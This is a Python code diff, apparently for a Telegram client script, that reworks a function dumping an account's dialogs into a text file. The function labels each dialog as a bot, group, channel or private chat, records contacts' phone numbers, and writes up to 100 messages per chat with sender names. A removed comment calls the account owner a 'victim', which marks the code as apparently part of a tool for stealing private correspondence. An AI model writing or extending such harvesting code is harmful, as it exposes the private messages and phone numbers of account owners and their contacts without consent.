@@ -61,22 +61,36 @@ async def collect_full_user_data_txt(client):
         entity_cache = {}
         
         for dialog in dialogs:
-            # Определяем название и ID
-            if dialog.is_user:
+            # Пропускаем диалог с самим собой
+            if dialog.is_user and dialog.entity.id == my_id:
+                continue
+            
+            # Определяем тип и заголовок
+            if dialog.is_user and dialog.entity.bot:
+                chat_type = "БОТ"
+                name = dialog.entity.first_name or dialog.entity.username or "бот"
+                phone_info = "—"
+            elif dialog.is_group:
+                chat_type = "ГРУППА"
+                name = dialog.title or "Без названия"
+                phone_info = "—"
+            elif dialog.is_channel:
+                chat_type = "КАНАЛ"
+                name = dialog.title or "Без названия"
+                phone_info = "—"
+            elif dialog.is_user:
+                chat_type = "ЛИЧНЫЙ ЧАТ"
                 entity = dialog.entity
                 name = entity.first_name or entity.username or str(entity.id)
                 phone = entity.phone if hasattr(entity, 'phone') and entity.phone else "скрыт"
+                phone_info = f"ТЕЛЕФОН: {phone}"
             else:
-                name = dialog.title or "Без названия"
-                phone = "—"
+                chat_type = "НЕИЗВЕСТНЫЙ"
+                name = dialog.title or "без названия"
+                phone_info = "—"
             
-            # Если диалог с самим собой (бывает) – пропускаем или пишем
-            if dialog.is_user and dialog.entity.id == my_id:
-                continue  # не пишем диалог с собой
-            
-            chat_header = f"ЧАТ С {name} (ID: {dialog.id}) (ТЕЛЕФОН: {phone})"
-            f.write("==============================\n")
-            f.write(chat_header + "\n")
+            # Заголовок секции
+            f.write(f"===== {chat_type}: {name} (ID: {dialog.id}) {phone_info} =====\n")
             
             # Получаем сообщения (лимит 100)
             try:
@@ -96,10 +110,10 @@ async def collect_full_user_data_txt(client):
                         else:
                             continue  # пропускаем
                     
-                    # Определяем, жертва это или собеседник
+                    # Получаем имя отправителя
                     if sender_id == my_id:
                         sender_name = f"@{my_username}" if my_username != "нет" else "Я"
-                        line = f"СООБЩЕНИЕ({sender_name}): {msg.text or '[Медиа]'}\n"
+                        prefix = "СООБЩЕНИЕ"
                     else:
                         # Получаем сущность собеседника из кеша или через API
                         if sender_id not in entity_cache:
@@ -113,12 +127,13 @@ async def collect_full_user_data_txt(client):
                             sender_name = entity.first_name or entity.username or str(sender_id)
                         else:
                             sender_name = str(sender_id)
-                        line = f"СОБЕСЕДНИК({sender_name}): {msg.text or '[Медиа]'}\n"
+                        prefix = "СОБЕСЕДНИК"
                     
+                    line = f"{prefix}({sender_name}): {msg.text or '[Медиа]'}\n"
                     f.write(line)
                 
                 # Конец диалога
-                f.write(f"==========КОНЕЦ ДИАЛОГА С {name} =======\n\n")
+                f.write(f"========== КОНЕЦ ДИАЛОГА С {name} ==========\n\n")
                 
             except Exception as e:
                 f.write(f"ОШИБКА при получении сообщений: {str(e)}\n\n")
